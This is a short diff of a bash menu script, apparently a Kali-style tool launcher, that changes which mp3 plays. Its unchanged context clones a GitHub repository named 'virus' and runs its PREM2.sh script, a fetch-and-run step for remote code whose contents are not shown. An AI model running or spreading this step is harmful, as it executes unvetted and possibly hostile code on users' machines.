@@ -51,7 +51,7 @@ read -p "╚════ROOT®KALI════> : " p
 if [ $p == 1 ]
 then
 clear
-mpv wibu.mp3
+mpv phonk3.mp3
 git clone https://github.com/Kingcy78/virus
 cd virus
 bash PREM2.sh
